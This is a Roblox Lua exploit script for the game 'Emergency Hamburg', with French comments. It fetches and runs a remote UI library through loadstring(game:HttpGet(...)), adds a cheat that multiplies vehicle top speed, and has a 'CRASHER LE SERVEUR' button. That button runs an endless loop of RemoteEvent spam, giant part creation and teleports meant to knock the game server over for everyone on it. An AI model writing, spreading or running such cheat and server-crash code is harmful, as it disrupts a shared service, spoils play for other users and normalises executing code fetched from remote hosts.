-- 📌 Chargement de Rayfield UI
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

if not Rayfield then
    warn("❌ Rayfield UI n'a pas pu être chargé !")
    return
end
print("✅ Rayfield UI chargé avec succès !")

-- 📌 Création de la fenêtre principale
local Window = Rayfield:CreateWindow({
    Name = "Emergency Hamburg",
    LoadingTitle = "Hamburg Script 🔥 v1.0",
    LoadingSubtitle = "By azfasty",
    Theme = "Default",
    ConfigurationSaving = {Enabled = false}
})

-- 📌 Onglet Véhicule
local VehicleTab = Window:CreateTab("Véhicule", "car")

-- 🔹 Variables
local speedBoostEnabled = false
local boostMultiplier = 2  -- Par défaut, double la vitesse
local originalSpeed = {}

-- ✅ Toggle pour activer/désactiver le Speed Boost
VehicleTab:CreateToggle({
    Name = "Activer Speed Boost",
    CurrentValue = false,
    Flag = "SpeedBoost",
    Callback = function(state)
        speedBoostEnabled = state
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character.Parent then
            local vehicle = player.Character.Parent
            if vehicle and vehicle:FindFirstChild("Engine") then
                local engine = vehicle.Engine
                if engine:FindFirstChild("MaxSpeed") then
                    -- Sauvegarde de la vitesse de base
                    if not originalSpeed[vehicle] then
                        originalSpeed[vehicle] = engine.MaxSpeed.Value
                    end
                    
                    if speedBoostEnabled then
                        engine.MaxSpeed.Value = originalSpeed[vehicle] * boostMultiplier
                    else
                        engine.MaxSpeed.Value = originalSpeed[vehicle]
                    end
                end
            end
        end
    end
})

-- ✅ Slider pour régler la puissance du boost
VehicleTab:CreateSlider({
    Name = "Puissance du Boost",
    Range = {1, 5},  -- De x1 à x5
    Increment = 0.5,
    CurrentValue = boostMultiplier,
    Flag = "BoostMultiplier",
    Callback = function(value)
        boostMultiplier = value
    end
})

-- ✅ Bouton pour remettre la vitesse normale
VehicleTab:CreateButton({
    Name = "Réinitialiser la Vitesse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character.Parent then
            local vehicle = player.Character.Parent
            if vehicle and vehicle:FindFirstChild("Engine") then
                local engine = vehicle.Engine
                if engine:FindFirstChild("MaxSpeed") and originalSpeed[vehicle] then
                    engine.MaxSpeed.Value = originalSpeed[vehicle]
                end
            end
        end
    end
})

-- 📌 Onglet Crash Serveur
local CrashTab = Window:CreateTab("Crash", "alert-triangle")

-- ✅ Bouton pour crasher le serveur
CrashTab:CreateButton({
    Name = "⚠️ CRASHER LE SERVEUR",
    Callback = function()
        while true do
            -- 1️⃣ Spam des Remote Events pour surcharger le serveur
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    v:FireServer()
                end
            end
            
            -- 2️⃣ Création infinie d'objets pour surcharger la mémoire
            local obj = Instance.new("Part")
            obj.Parent = game.Workspace
            obj.Size = Vector3.new(1000, 1000, 1000)
            obj.Anchored = true
            
            -- 3️⃣ Téléportation rapide (le serveur ne suit plus)
            local player = game.Players.LocalPlayer
            if player and player.Character then
                player.Character:SetPrimaryPartCFrame(player.Character:GetPrimaryPartCFrame() * CFrame.new(100, 0, 0))
            end
        end
    end
})

print("🔥 Speed Boost & Crash Serveur chargé avec succès !")
